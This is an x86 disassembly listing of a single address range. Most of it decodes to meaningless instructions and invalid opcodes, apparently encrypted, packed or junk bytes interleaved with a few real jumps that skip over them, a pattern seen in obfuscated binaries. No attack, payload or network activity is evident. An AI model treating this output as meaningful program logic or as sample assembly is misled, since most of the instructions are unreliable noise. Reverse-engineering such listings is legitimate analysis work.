  41575c:	int    0x61
  41575e:	push   ebp
  41575f:	test   eax,0x64a3fa45
  415764:	dec    DWORD PTR [ecx-0x13f344d]
  41576a:	lock fld TBYTE PTR [eax-0x5ace5109]
  415771:	inc    esp
  415772:	aam    0x98
  415774:	out    dx,al
  415775:	sbb    DWORD PTR [edx-0x68146ad8],eax
  41577b:	inc    ecx
  41577c:	cmp    eax,0x1b42a983
  415781:	adc    DWORD PTR [eax+0x6bacf78],ecx
  415787:	dec    ebx
  415788:	xlat   BYTE PTR ds:[ebx]
  415789:	imul   ebp,DWORD PTR [edi-0x16],0xc
  41578d:	arpl   bp,sp
  41578f:	cmp    eax,0x3a62c321
  415794:	sub    ecx,0x33ce317c
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [edx+edi*8+0xf7f7c00],al
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xad70707e
  4157c4:	jge    0x4157cd
  4157c6:	mov    WORD PTR [edx+eiz*8+0x4966ad6e],ds
  4157cd:	mov    ds:0x93d88212,al
  4157d2:	xchg   ebp,eax
  4157d3:	in     al,dx
  4157d4:	test   dl,0xb2
  4157d7:	push   0x6a8b3518
  4157dc:	pop    ecx
  4157dd:	push   0x44
  4157df:	fisub  DWORD PTR [edi+0xc]
  4157e2:	clac   
  4157e5:	mov    bl,0xe6
  4157e7:	repnz cmp BYTE PTR gs:[ebp-0x8],dh
  4157ec:	mov    ds:0xd9e1841d,al
  4157f1:	pop    ebp
  4157f2:	jne    0x4157fd
  4157f4:	jg     0x415797
  4157f6:	fimul  DWORD PTR [edx]
  4157f8:	sar    DWORD PTR [ebx+0x46],cl
  4157fb:	pop    ebp
  4157fc:	adc    DWORD PTR [edi+ecx*2+0x68],0xac51c8fd
  415804:	sub    DWORD PTR [eax+0x52],edx
  415807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415808:	jmp    0xc61f:0xbfc85d88
  41580f:	retf   
  415810:	push   edi
  415811:	or     esi,DWORD PTR [edi-0x65b0499b]
  415817:	pop    ebx
  415818:	and    BYTE PTR [ebp+edi*1-0x31a3923b],ch
  41581f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415820:	lods   al,BYTE PTR ds:[esi]
  415821:	mov    eax,0xa5626fd0
  415826:	jno    0x41587b
  415828:	jne    0x415885
  41582a:	daa    
  41582b:	dec    ebp
  41582c:	jle    0x415859
  41582e:	adc    ah,al
  415830:	out    0x6,eax
  415832:	add    eax,DWORD PTR [edx+ebp*1-0x7ed3093b]
  415839:	scas   al,BYTE PTR es:[edi]
  41583a:	sbb    DWORD PTR [eax],ebx
  41583c:	xchg   ebp,eax
  41583d:	adc    ch,BYTE PTR [ebx]
  41583f:	dec    edx
  415840:	addr16 sub edi,esp
  415843:	sub    eax,0x1d4acec8
  415848:	out    dx,al
  415849:	mov    ch,0xfa
  41584b:	sbb    eax,0x1a07d1cf
  415850:	and    DWORD PTR [ecx-0x1b1370f8],0xffffffc6
  415857:	mov    ds:0xd734fedd,al
  41585c:	hlt    
  41585d:	mov    DWORD PTR [ebp+0x3b],edx
  415860:	in     eax,0xd0
  415862:	mov    dh,ah
  415864:	(bad)  
  415865:	out    0xda,al
  415867:	mov    ecx,ebp
  415869:	repz adc eax,0xfd18cc8
  41586f:	(bad)  
  415870:	aaa    
  415871:	jno    0x415847
  415873:	push   0x7a1b0e5c
  415878:	jnp    0x4158d5
  41587a:	push   es
  41587b:	mov    ?,WORD PTR [eax+0x22f3dce5]
  415881:	and    al,0x2e
  415883:	and    al,0x17
  415885:	enter  0x71e1,0x33
  415889:	rol    bl,0xcb
  41588c:	ins    BYTE PTR es:[edi],dx
  41588d:	outs   dx,BYTE PTR ds:[esi]
  41588e:	mov    ebx,DWORD PTR [ebp+0x77342dda]
  415894:	dec    edx
  415895:	push   ebp
  415896:	es (bad) 
  415898:	cmp    DWORD PTR [eax+0x793a68f2],esp
  41589e:	lea    eax,[edi]
  4158a0:	and    BYTE PTR [eax-0x75],al
  4158a3:	dec    ebx
  4158a4:	xchg   BYTE PTR [ecx-0xb570afd],bh
  4158aa:	and    eax,0x894095f4
  4158af:	shl    BYTE PTR [esi+0x1e47b11e],0x40
  4158b6:	push   0xb29fb38c
  4158bb:	pop    ebp
  4158bc:	xchg   edx,eax
  4158bd:	add    al,0x39
  4158bf:	jl     0x415869
  4158c1:	sbb    al,0x11
  4158c3:	call   0x447a0a11
  4158c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158c9:	mov    WORD PTR [ebp-0x20c7507a],cs
  4158cf:	jno    0x41592f
  4158d1:	mov    cl,0x60
  4158d3:	push   ss
  4158d4:	or     ch,cl
  4158d6:	daa    
  4158d7:	es xchg ebp,eax
  4158d9:	les    edi,FWORD PTR [ebx]
  4158db:	mov    edi,0xadd9f9a5
  4158e0:	push   ds
  4158e1:	mov    edx,0xc8709d2d
  4158e6:	inc    esi
  4158e7:	mov    dl,0xc0
  4158e9:	(bad)  
  4158ea:	std    
  4158eb:	jp     0x4158b3
  4158ed:	dec    esi
  4158ee:	adc    eax,0x507f54f2
  4158f3:	and    eax,0x6e9accc
  4158f8:	xor    al,0xad
  4158fa:	push   esi
  4158fb:	inc    ebx
  4158fc:	push   ebx
  4158fd:	test   ecx,0x530acf3a
  415903:	push   es
  415904:	sub    eax,0xcca6665f
  415909:	xchg   esi,eax
  41590a:	test   al,0xe8
  41590c:	dec    edi
  41590d:	jb     0x41598a
  41590f:	hlt    
  415910:	inc    esp
  415911:	inc    eax
  415912:	pop    ebx
  415913:	leave  
  415914:	mov    ebx,0x2bdd3112
  415919:	and    ebx,esi
  41591b:	aam    0x5d
  41591d:	das    
  41591e:	dec    esp
  41591f:	loop   0x415955
  415921:	std    
  415922:	out    dx,eax
  415923:	leave  
  415924:	scas   eax,DWORD PTR es:[edi]
  415925:	daa    
  415926:	inc    ebp
  415927:	inc    esi
  415928:	daa    
  415929:	push   esi
  41592a:	xchg   ecx,eax
  41592b:	(bad)  
  41592c:	mov    esi,ecx
  41592e:	or     eax,0x52883d16
  415933:	mov    al,0x65
  415935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415936:	mov    bl,0x9a
  415938:	inc    esi
  415939:	aad    0x41
  41593b:	adc    edx,DWORD PTR [ecx+0x4344a714]
  415941:	mov    eax,0xd4c3b19e
  415946:	mov    ds:0xeeb56e4b,al
  41594b:	xchg   esp,eax
  41594c:	xor    al,0xb
  41594e:	push   es
  41594f:	ins    BYTE PTR es:[edi],dx
  415950:	jmp    0xdace:0x1fc74e6a
  415957:	fld    QWORD PTR [ebx-0x2e]
  41595a:	fiadd  DWORD PTR [eax-0x2b]
  41595d:	fisttp QWORD PTR [edx-0x3b]
  415960:	lea    ebp,[ebx+0x2a]
  415963:	sbb    edx,DWORD PTR [edi+0x6d]
  415966:	fidivr DWORD PTR [edi]
  415968:	xor    al,dl
  41596a:	push   ecx
  41596b:	push   es
  41596c:	imul   esp,DWORD PTR [ebx],0x23822221
  415972:	stos   BYTE PTR es:[edi],al
  415973:	or     eax,0x277b62f0
  415978:	ss mov ebp,0x4113800e
  41597e:	xor    al,0xab
  415980:	aas    
  415981:	jb     0x415958
  415983:	add    BYTE PTR [esi+0xa],bh
  415986:	xchg   ecx,eax
  415987:	sti    
  415988:	iret   
  415989:	xor    eax,0x1df49d
  41598e:	pop    edx
  41598f:	bound  edx,QWORD PTR ds:0x12b44776
  415995:	imul   ebp,DWORD PTR [edi+0x32e9cd55],0x75
  41599c:	ds sti 
  41599e:	adc    al,BYTE PTR [esi]
  4159a0:	add    eax,DWORD PTR [ecx+0x43]
  4159a3:	std    
  4159a4:	mov    WORD PTR [ebx+eiz*4-0x466205ef],ss
  4159ab:	imul   edi,DWORD PTR [ebx],0x37
  4159ae:	repnz fcom QWORD PTR [ebp+0x38]
  4159b2:	pop    ss
  4159b3:	shl    BYTE PTR [eax+0x5f],0x8
  4159b7:	xchg   esp,eax
  4159b8:	ins    BYTE PTR es:[edi],dx
  4159b9:	cmp    eax,0xd80de411
  4159be:	ja     0x415972
  4159c0:	test   eax,0x1c34cdea
  4159c5:	(bad)  
  4159c6:	out    0x12,al
  4159c8:	loop   0x4159c1
  4159ca:	bound  esp,QWORD PTR [esi]
  4159cc:	fstp   TBYTE PTR [esi+0x4d74945]
  4159d2:	aaa    
  4159d3:	jno    0x4159fe
  4159d5:	call   0x88df:0xd8fb5b4f
  4159dc:	xchg   DWORD PTR [eax-0x3ea6b7],eax
  4159e2:	imul   ebx,DWORD PTR [eax],0x64
  4159e5:	xchg   ecx,eax
  4159e6:	xchg   edx,eax
  4159e7:	into   
  4159e8:	shr    ebx,cl
  4159ea:	or     BYTE PTR [esi],dh
  4159ec:	test   DWORD PTR [edi],ebx
  4159ee:	call   0x2a749ee1
  4159f3:	push   esi
  4159f4:	jmp    0x415a2a
  4159f6:	sti    
  4159f7:	mov    dh,al
  4159f9:	add    DWORD PTR [ebx],ecx
  4159fb:	gs pusha 
  4159fd:	nop
  4159fe:	cmp    esp,DWORD PTR [edx]
  415a00:	(bad)  
  415a01:	mov    al,0xce
  415a03:	dec    eax
  415a04:	jbe    0x41599c
  415a06:	dec    BYTE PTR [edx+0x33]
  415a09:	mov    ch,0x1a
  415a0b:	cmp    bl,al
  415a0d:	add    eax,0x8bbc7846
  415a12:	sbb    al,al
  415a14:	inc    esi
  415a15:	sub    BYTE PTR [edx+0x7],bh
  415a18:	jl     0x415a7e
  415a1a:	push   cs
  415a1b:	fs int3 
  415a1d:	loope  0x415a76
  415a1f:	mov    ah,0x64
  415a21:	mov    esp,0xfdc4d301
  415a26:	das    
  415a27:	cwde   
  415a28:	daa    
  415a29:	(bad)  [ebp-0x75]
  415a2c:	leave  
  415a2d:	lods   eax,DWORD PTR ds:[esi]
  415a2e:	mov    al,0xc2
  415a30:	addr16 es fwait
  415a33:	shl    ah,0xdc
  415a36:	mov    al,BYTE PTR [ebp-0x54eb90cf]
  415a3c:	imul   esi,DWORD PTR [edx+0x7a],0x2
  415a40:	in     eax,dx
  415a41:	mov    edi,0xc12093ff
  415a46:	xchg   esp,eax
  415a47:	push   esp
  415a48:	aaa    
  415a49:	mov    dh,0x2
  415a4b:	mov    dl,0x2f
  415a4d:	push   edi
  415a4e:	lds    edx,FWORD PTR [edi-0x51]
  415a51:	inc    esi
  415a52:	adc    al,0x8a
  415a54:	or     DWORD PTR [esp+eax*1+0x35],0x693d4393
  415a5c:	cmp    eax,0x1e057678
  415a61:	sbb    BYTE PTR [esi+esi*4],ch
  415a64:	dec    ecx
  415a65:	je     0x415a26
  415a67:	pop    ebx
  415a68:	es inc ecx
  415a6a:	out    0xa9,eax
  415a6c:	mov    bh,0x1
  415a6e:	shl    BYTE PTR [eax-0x48ebf04b],cl
  415a74:	adc    DWORD PTR [esi-0x2259fbd],ebp
  415a7a:	cmp    eax,0x4c52929a
  415a7f:	jbe    0x415a96
  415a81:	mov    ah,0x7b
  415a83:	rol    DWORD PTR [edx],cl
  415a85:	pop    esi
  415a86:	scas   eax,DWORD PTR es:[edi]
  415a87:	inc    eax
  415a88:	inc    ecx
  415a89:	jp     0x415abe
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	pop    edx
  415aa5:	and    BYTE PTR [eax],cl
  415aa7:	sar    BYTE PTR [eax-0x468f80f3],1
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415ae4
  415ab1:	mov    ebp,0xf61f6bc7
  415ab6:	ficomp WORD PTR cs:[esi]
  415ab9:	(bad)  
  415aba:	dec    ebx
  415abb:	loop   0x415af0
  415abd:	sub    dl,BYTE PTR [eax+0xadb830e]
  415ac3:	ret    0xa1b1
  415ac6:	ds jmp 0xf0fe:0xcd47be1d
  415ace:	adc    BYTE PTR [esi+0xd],bl
  415ad1:	dec    esi
  415ad2:	fs out dx,eax
  415ad4:	jg     0x415aab
  415ad6:	pop    ebx
  415ad7:	fs scas eax,DWORD PTR es:[edi]
  415ad9:	push   esp
  415ada:	inc    esp
  415adb:	xor    al,0x1d
  415add:	inc    edi
  415ade:	fdivrp st(5),st
  415ae0:	ds pop ss
  415ae2:	mov    ?,WORD PTR [ecx+0x7a]
  415ae5:	outs   dx,DWORD PTR ds:[esi]
  415ae6:	jge    0x415aca
  415ae8:	rcr    BYTE PTR ds:[edx],1
  415aeb:	xor    ebp,DWORD PTR [ebx]
  415aed:	into   
  415aee:	ret    
  415aef:	mov    al,ds:0x9e9e86e4
  415af4:	jmp    0x8018a9a0
  415af9:	sbb    al,0x40
  415afb:	cdq    
  415afc:	adc    eax,0x6cc93231
  415b01:	jl     0x415b82
  415b03:	imul   esp,DWORD PTR [esi],0x3a
  415b06:	and    BYTE PTR [edx],0xe
  415b09:	sar    eax,1
  415b0b:	or     DWORD PTR ds:0x4139bfb6,edi
  415b11:	(bad)  
  415b12:	pop    ss
  415b13:	fdivr  QWORD PTR [edi-0x43]
  415b16:	cmp    al,0xac
  415b18:	test   BYTE PTR [ecx+0x36],al
  415b1b:	hlt    
  415b1c:	xor    DWORD PTR [ebp-0xbb9dfb1],ebp
  415b22:	or     edi,0xffffffc7
  415b25:	adc    BYTE PTR [eax],cl
  415b27:	mov    BYTE PTR [eax],dh
  415b29:	ss pop edx
  415b2b:	or     edi,DWORD PTR [ecx-0x46]
  415b2e:	dec    esi
  415b2f:	ror    DWORD PTR [ebx],0x8f
  415b32:	clc    
  415b33:	(bad)  
  415b34:	das    
  415b35:	xchg   esi,eax
  415b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b37:	sub    eax,0x9b26caa3
  415b3c:	inc    BYTE PTR [eax+0x65]
  415b3f:	aaa    
  415b40:	adc    ebx,DWORD PTR [ebp+esi*2-0x30]
  415b44:	adc    eax,0x89eec247
  415b49:	inc    edi
  415b4a:	pop    eax
  415b4b:	in     eax,0x76
  415b4d:	xor    al,0x75
  415b4f:	sub    eax,0x94fbdfa
  415b54:	cwde   
  415b55:	fldenv [esi-0x3e]
  415b58:	aaa    
  415b59:	sub    al,0x24
  415b5b:	cmp    al,0xd8
  415b5d:	jns    0x415b84
  415b5f:	mov    WORD PTR [edi-0x18],fs
  415b62:	shl    BYTE PTR [esp+ebp*1],cl
  415b65:	xchg   esp,eax
  415b66:	ret    0x277e
  415b69:	sub    al,0xbb
  415b6b:	inc    edi
  415b6c:	jb     0x415b0d
  415b6e:	inc    edx
  415b6f:	adc    esi,DWORD PTR [edx+0x79f03380]
  415b75:	adc    ecx,DWORD PTR [edi]
  415b77:	xor    eax,0xa64b6d5b
  415b7c:	repnz add BYTE PTR [edi+0x505de098],0xd4
  415b84:	sti    
  415b85:	arpl   WORD PTR [eax-0x38],sp
  415b88:	add    esp,DWORD PTR [esi+0x66]
  415b8b:	fnstenv [edx+edi*8-0x66]
  415b8f:	push   edi
  415b90:	mov    bl,0xe6
  415b92:	in     eax,dx
  415b93:	int3   
  415b94:	sbb    ecx,DWORD PTR ds:0xb1c02c7
  415b9a:	fisttp DWORD PTR [edx+0x1add4896]
  415ba0:	cmp    eax,0x8b5b8692
  415ba5:	repnz aaa 
  415ba7:	mul    DWORD PTR [ebx-0x75]
  415baa:	in     eax,dx
  415bab:	iret   
  415bac:	pop    ebp
  415bad:	aam    0xd0
  415baf:	or     BYTE PTR [ebp-0x7dd83b44],bl
  415bb5:	lods   al,BYTE PTR ds:[esi]
  415bb6:	nop
  415bb7:	jbe    0x415bd4
  415bb9:	call   FWORD PTR ds:0x97fd924e
  415bbf:	xchg   ebx,eax
  415bc0:	(bad)  
  415bc1:	es and al,0x8f
  415bc4:	and    al,BYTE PTR [ebx+0x34d11463]
  415bca:	push   ecx
  415bcb:	test   bl,cl
  415bcd:	lods   al,BYTE PTR ds:[esi]
  415bce:	loope  0x415c19
  415bd0:	lea    eax,[ecx+0x66f3d968]
  415bd6:	mov    dh,0xb5
  415bd8:	int3   
  415bd9:	mov    dl,0x2
  415bdc:	call   0xf0eb62bf
  415be1:	jne    0x415b92
  415be3:	xchg   edi,eax
  415be4:	mov    ds:0x438898c8,al
  415be9:	sbb    ebx,DWORD PTR [edx-0x1b]
  415bec:	xchg   DWORD PTR [ebp-0x1f210072],ecx
  415bf2:	sti    
  415bf3:	cdq    
  415bf4:	xchg   DWORD PTR [ebx+0x8],edi
  415bf7:	(bad)  
  415bf8:	into   
  415bf9:	retf   0xee63
  415bfc:	popf   
  415bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bfe:	or     edx,DWORD PTR [ebx+ebp*1-0x581d0b66]
  415c05:	and    eax,0x4c183819
  415c0a:	sbb    ecx,esi
  415c0c:	cmp    al,0x88
  415c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c0f:	xor    eax,0x64072e6f
  415c14:	jl     0x415ba8
  415c16:	sbb    BYTE PTR [edi-0x1fee7d25],cl
  415c1c:	jb     0x415bf0
  415c1e:	pop    esi
  415c1f:	adc    al,0xcf
  415c21:	sar    edi,1
  415c23:	cmp    edi,edx
  415c25:	sub    eax,DWORD PTR [edi+0x1a]
  415c28:	add    DWORD PTR ss:[esi+0x40],eax
  415c2c:	fsubr  DWORD PTR ds:0x2b424a71
  415c33:	inc    eax
  415c34:	mov    edi,0xfd7f59de
  415c39:	(bad)  
  415c3a:	cmp    al,0xf
  415c3c:	or     ecx,DWORD PTR [ebx]
  415c3e:	push   ss
  415c3f:	sbb    eax,0xd3b81076
  415c44:	out    dx,al
  415c45:	jmp    0xcd03f6e1
  415c4a:	fdivr  QWORD PTR [ecx+0x65d5c6fa]
  415c50:	inc    edi
  415c51:	or     DWORD PTR [edi+0x10c3da1f],eax
  415c57:	out    0x71,eax
  415c59:	stos   DWORD PTR es:[edi],eax
  415c5a:	xor    bl,dl
  415c5c:	dec    eax
  415c5d:	add    al,0x6e
  415c5f:	jnp    0x415be2
  415c61:	into   
  415c62:	out    dx,eax
  415c63:	xlat   BYTE PTR ds:[ebx]
  415c64:	loop   0x415c6f
  415c66:	fnstcw WORD PTR [edi-0x72]
  415c69:	sbb    BYTE PTR [ebx+ecx*8],bl
  415c6c:	sub    DWORD PTR [ecx],esp
  415c6e:	test   al,0xc0
  415c70:	pusha  
  415c71:	repz bound esp,QWORD PTR [esi+0x3cd7aff8]
  415c78:	imul   edi,DWORD PTR [eax+0xa90d156],0x6926da21
  415c82:	mov    ch,BYTE PTR [eax-0x33c52ae4]
  415c88:	mov    bl,0xec
  415c8a:	jmp    0x415c83
  415c8c:	sbb    ebx,DWORD PTR [edi+ebp*2+0x55]
  415c90:	or     BYTE PTR ds:0x331de19b,cl
  415c96:	nop
  415c97:	leave  
  415c98:	(bad)  
  415c99:	mov    esi,0xd9a0ffb6
  415c9e:	mov    bl,0x9f
  415ca0:	or     BYTE PTR [eax+0x5ae3b8e],dh
  415ca6:	(bad)  
  415ca7:	retf   
  415ca8:	pop    ebx
  415ca9:	shl    ah,0x3
  415cac:	mov    esi,edi
  415cae:	(bad)  
  415caf:	clc    
  415cb0:	je     0x415ced
  415cb2:	mov    bl,0xc1
  415cb4:	push   ds
  415cb5:	dec    ebp
  415cb6:	cmc    
  415cb7:	jl     0x415d13
  415cb9:	imul   edi,DWORD PTR [eax+0x1a0d4604],0x78c90466
  415cc3:	das    
  415cc4:	dec    ebp
  415cc5:	fidiv  DWORD PTR [eax-0x1]
  415cc8:	fdivr  DWORD PTR [ecx+ebp*2+0x6a]
  415ccc:	inc    edx
  415ccd:	sub    esp,DWORD PTR [edx]
  415ccf:	or     BYTE PTR [ebx-0x11],dh
  415cd2:	sbb    eax,0x60ec48ff
  415cd7:	pusha  
  415cd8:	add    eax,0x1dc004d9
  415cdd:	aad    0xd2
  415cdf:	lea    edx,[ecx+ebp*2+0x18724209]
  415ce6:	fist   WORD PTR [ecx]
  415ce8:	jmp    0x415c95
  415cea:	dec    ebp
  415ceb:	fisttp QWORD PTR [eax]
  415ced:	mov    ch,0xf8
  415cef:	in     eax,0x2b
  415cf1:	push   edx
  415cf2:	push   es
  415cf3:	cmp    al,0xe5
  415cf5:	mov    BYTE PTR [ecx+0x222c17d9],ah
  415cfb:	call   0x3c2f91b4
  415d00:	jg     0x415ce1
  415d02:	xor    BYTE PTR ds:0x5947d782,al
  415d08:	add    ch,dl
  415d0a:	int3   
  415d0b:	popa   
  415d0c:	repnz (bad)
  415d0f:	add    DWORD PTR [ebx-0x17],ecx
  415d12:	cdq    
  415d13:	mov    BYTE PTR [esi],cl
  415d15:	sar    DWORD PTR [edi],cl
  415d17:	loop   0x415caa
  415d19:	test   al,0xdd
  415d1b:	xor    esi,ebp
  415d1d:	cmp    esi,edx
  415d1f:	daa    
  415d20:	and    DWORD PTR [ecx],0xd8ebd3f0
  415d26:	and    al,0xc5
  415d29:	push   es
  415d2a:	stos   BYTE PTR es:[edi],al
  415d2b:	sub    al,0x82
  415d2d:	ins    DWORD PTR es:[edi],dx
  415d2e:	or     ah,BYTE PTR [ebx-0x16772f42]
  415d34:	arpl   WORD PTR [edi+0x5858f1c0],ax
  415d3a:	call   0x9151dfb4
  415d3f:	add    BYTE PTR [ebp-0x36],ch
  415d42:	sbb    DWORD PTR [eax],eax
  415d44:	std    
  415d45:	sbb    esp,DWORD PTR [ecx-0xa]
  415d48:	cmp    BYTE PTR [ebp+0x31bcbdc1],ch
  415d4e:	call   0xf17d:0x30952b71
  415d55:	xor    dh,al
  415d57:	sbb    BYTE PTR [eax-0x7],al
  415d5a:	mov    bl,0x42
  415d5c:	icebp  
  415d5d:	in     eax,dx
  415d5e:	popf   
  415d5f:	bound  ebx,QWORD PTR [edi-0x1]
  415d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d63:	push   0x2f4e4c07
  415d68:	lock inc edi
  415d6a:	fdivr  DWORD PTR [eax]
  415d6c:	jge    0x415cf9
  415d6e:	mov    BYTE PTR [ebx+0x19c02d98],bh
  415d74:	dec    edi
  415d75:	mov    dh,ah
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	lods   eax,DWORD PTR ds:[esi]
  415d95:	mov    WORD PTR [ebx-0x19],ss
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	mov    bh,0x35
  415da2:	cmp    BYTE PTR [ecx+0x29],ah
  415da5:	jns    0x415e0e
  415da7:	pop    edx
  415da8:	popa   
  415da9:	jae    0x415d4a
  415dab:	dec    eax
  415dac:	sbb    DWORD PTR [esi+edx*4+0x6e],eax
  415db0:	cmc    
  415db1:	popf   
  415db2:	scas   eax,DWORD PTR es:[edi]
  415db3:	adc    eax,0xd2760b83
  415db8:	or     ebp,DWORD PTR [edi]
  415dba:	pop    es
  415dbb:	scas   al,BYTE PTR es:[edi]
  415dbc:	push   ss
  415dbd:	inc    ebx
  415dbe:	shl    DWORD PTR ds:0x59ea72f3,1
  415dc4:	(bad)  
  415dc5:	(bad)  
  415dc6:	js     0x415e26
  415dc8:	pop    ds
  415dc9:	pop    ebp
  415dca:	(bad)  
  415dcb:	adc    cl,BYTE PTR [edi+0x78c684a1]
  415dd1:	(bad)  
  415dd3:	or     al,0xa7
  415dd5:	pop    edx
  415dd6:	rcr    BYTE PTR [eax-0x6c],cl
  415dd9:	xchg   DWORD PTR [eax-0x52b95fde],ecx
  415ddf:	test   BYTE PTR [ecx-0x34],0x34
  415de3:	ins    DWORD PTR es:[edi],dx
  415de4:	pusha  
  415de5:	das    
  415de6:	add    DWORD PTR [edx-0xa8dd7a8],ebx
  415dec:	out    0xaa,al
  415dee:	mov    ebx,0xb8d7c7f5
  415df3:	jg     0x415d91
  415df5:	clc    
  415df6:	inc    ebp
  415df7:	jecxz  0x415db0
  415df9:	js     0x415e78
  415dfb:	lea    eax,[esi]
  415dfd:	sahf   
  415dfe:	or     bh,al
  415e00:	push   ebp
  415e01:	xchg   BYTE PTR [edi+0x49],dh
  415e04:	and    ch,bl
  415e06:	and    ch,BYTE PTR [ebp+0x1aff7cf4]
  415e0c:	sub    ebx,ebx
  415e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e0f:	pop    eax
  415e10:	into   
  415e11:	test   eax,0x8c5a2875
  415e16:	ret    0xe72e
  415e19:	dec    edi
  415e1a:	jle    0x415da3
  415e1c:	mov    ecx,0x32974608
  415e21:	cmp    al,0xdb
  415e23:	test   eax,0x9e1eff77
  415e28:	in     al,dx
  415e29:	xchg   edx,eax
  415e2a:	push   edi
  415e2b:	repnz mov ds:0x26307082,al
  415e31:	mov    dh,BYTE PTR [edi-0x19ba2e78]
  415e37:	fwait
  415e38:	sbb    al,BYTE PTR ds:0x6623cdf4
  415e3e:	mov    ecx,0x35ba2262
  415e43:	and    eax,0x72e2c12f
  415e48:	sub    bl,BYTE PTR [ecx-0x1882cd41]
  415e4e:	jle    0x415e05
  415e50:	adc    al,0xcc
  415e52:	pop    ebp
  415e53:	or     DWORD PTR [edi+ebp*4-0x13a2c643],edi
  415e5a:	and    dh,ch
  415e5c:	and    DWORD PTR [eax+ebx*8+0x59],eax
  415e60:	mov    bh,0xa4
  415e62:	add    DWORD PTR [esi],ecx
  415e64:	jp     0x415e27
  415e66:	ret    
  415e67:	xchg   DWORD PTR [eax],ebx
  415e69:	mov    edi,0xd350f00b
  415e6e:	fld    QWORD PTR [ebx+0x6eefc8fb]
  415e74:	repz out 0x9d,al
  415e77:	fidivr DWORD PTR [eax-0xc]
  415e7a:	pop    edi
  415e7b:	or     BYTE PTR [eax+0x6dce029],ah
  415e81:	fnstenv [ebp-0x6592e7ea]
  415e87:	cmp    BYTE PTR [ebx],ch
  415e89:	outs   dx,DWORD PTR ds:[esi]
  415e8a:	fs das 
  415e8c:	aas    
  415e8d:	mov    ds:0xf41eb2d0,eax
  415e92:	and    edx,DWORD PTR ds:[edi-0x1b]
  415e96:	pop    eax
  415e97:	dec    ebp
  415e98:	aam    0x2f
  415e9a:	adc    esp,DWORD PTR [esi-0x16]
  415e9d:	pop    ecx
  415e9e:	mov    ebx,0x7454059a
  415ea3:	in     eax,0x95
  415ea5:	xlat   BYTE PTR ds:[ebx]
  415ea6:	adc    DWORD PTR [ebp-0x28],edi
  415ea9:	mov    edi,0xf1a47f04
  415eae:	jge    0x415e5f
  415eb0:	or     DWORD PTR ds:0x1353d66d,edx
  415eb6:	cli    
  415eb7:	stc    
  415eb8:	inc    edx
  415eb9:	rcr    BYTE PTR [ebx],cl
  415ebb:	jmp    0x415f37
  415ebd:	cld    
  415ebe:	data16 mov dl,0x75
  415ec1:	into   
  415ec2:	sbb    bh,bl
  415ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ec5:	inc    edi
  415ec6:	fsubp  st(3),st
  415ec8:	add    al,0x22
  415eca:	dec    ebx
  415ecb:	in     eax,0x61
  415ecd:	sbb    edi,DWORD PTR [edi]
  415ecf:	iret   
  415ed0:	ss pop ecx
  415ed2:	xor    ah,BYTE PTR cs:[ebp-0x26]
  415ed6:	data16 ss fwait
  415ed9:	add    al,0xdc
  415edb:	bound  ebp,QWORD PTR [ecx]
  415edd:	ret    0xe648
  415ee0:	sub    eax,0x37f0826d
  415ee5:	mov    ebx,0x968a968b
  415eea:	stos   BYTE PTR es:[edi],al
  415eeb:	leave  
  415eec:	jl     0x415f6c
  415eee:	pop    esi
  415eef:	xor    eax,DWORD PTR [ebx-0x6fbc3d50]
  415ef5:	jno    0x415edf
  415ef7:	das    
  415ef8:	enter  0x3739,0xda
  415efc:	test   al,0x94
  415efe:	or     DWORD PTR [ebp+0x37d2f533],esp
  415f04:	int3   
  415f05:	enterw 0xee6,0xc6
  415f0a:	jno    0x415f54
  415f0c:	in     al,dx
  415f0d:	hlt    
  415f0e:	xor    dh,al
  415f10:	xchg   edi,eax
  415f11:	lods   al,BYTE PTR ds:[esi]
  415f12:	cld    
  415f13:	sbb    ah,BYTE PTR [ebp+0x7c]
  415f16:	pop    edx
  415f17:	les    esi,FWORD PTR [ebx-0x15]
  415f1a:	ins    DWORD PTR es:[edi],dx
  415f1b:	and    DWORD PTR [eax],ebp
  415f1d:	outs   dx,BYTE PTR ds:[esi]
  415f1e:	test   eax,0x9acbfeca
  415f23:	mov    ds:0x6e5c5bf4,eax
  415f28:	arpl   WORD PTR [esi],bx
  415f2a:	test   eax,0xfa4017ec
  415f2f:	shl    BYTE PTR [esi+eax*4-0x58],cl
  415f33:	mov    dh,0x5d
  415f35:	addr16 out dx,eax
  415f37:	xchg   BYTE PTR [ecx],ah
  415f39:	loopne 0x415f15
  415f3b:	xchg   esp,eax
  415f3c:	xor    edx,DWORD PTR ds:0xe95171e3
